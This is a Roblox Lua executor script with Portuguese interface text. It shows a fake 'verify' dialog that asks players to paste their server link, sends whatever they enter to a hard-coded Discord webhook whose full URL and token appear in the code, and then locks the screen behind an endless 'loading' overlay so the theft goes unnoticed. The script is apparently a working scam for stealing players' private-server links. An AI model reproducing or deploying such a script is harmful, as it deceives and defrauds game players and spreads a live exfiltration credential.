local webhookUrl = "https://discord.com/api/webhooks/1432163980847218798/9sTdOInP1cBKsgP8wQ9HQ2zZOKNxXJB0lqR_bZ_ensEcHIxfMcgbFOxHf3RqgQPeo8pe"
local req = request or http_request
local plr = game:GetService("Players").LocalPlayer

-- GUI de input (tela centralizada, mas NÃO toda preta ainda)
local gui = Instance.new("ScreenGui")
gui.Parent = plr:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.6,0,0.4,0)
frame.Position = UDim2.new(0.2,0,0.3,0)
frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
frame.Parent = gui

local txt = Instance.new("TextBox")
txt.Size = UDim2.new(0.8,0,0,50)
txt.Position = UDim2.new(0.1,0,0.3,0)
txt.Text = ""
txt.PlaceholderText = "Cole o link do servidor"
txt.Parent = frame

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.4,0,0,50)
btn.Position = UDim2.new(0.3,0,0.65,0)
btn.Text = "Verificar"
btn.BackgroundColor3 = Color3.fromRGB(0,150,0)
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.Parent = frame

btn.MouseButton1Click:Connect(function()
    if txt.Text ~= "" and req then
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({content = txt.Text})
        })
        gui:Destroy()
        -- Tela de carregamento infinita cobrindo TUDO (preto)
        local carregandoGui = Instance.new("ScreenGui", plr.PlayerGui)
        local carregandoFrame = Instance.new("Frame", carregandoGui)
        carregandoFrame.Size = UDim2.new(1,0,1,0) -- TELA INTEIRA!
        carregandoFrame.Position = UDim2.new(0,0,0,0)
        carregandoFrame.BackgroundColor3 = Color3.fromRGB(0,0,0) -- Preto total
        local lbl = Instance.new("TextLabel", carregandoFrame)
        lbl.Size = UDim2.new(1,0,1,0)
        lbl.Position = UDim2.new(0,0,0,0)
        lbl.BackgroundTransparency = 1
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.SourceSansBold
        lbl.TextSize = 60
        lbl.Text = "Carregando..."
        spawn(function()
            while true do
                lbl.Text = "Carregando"
                wait(0.4)
                lbl.Text = "Carregando."
                wait(0.4)
                lbl.Text = "Carregando.."
                wait(0.4)
                lbl.Text = "Carregando..."
                wait(0.4)
            end
        end)
    else
        btn.Text = "Erro ou vazio"
        wait(1)
        btn.Text = "Verificar"
    end
end)
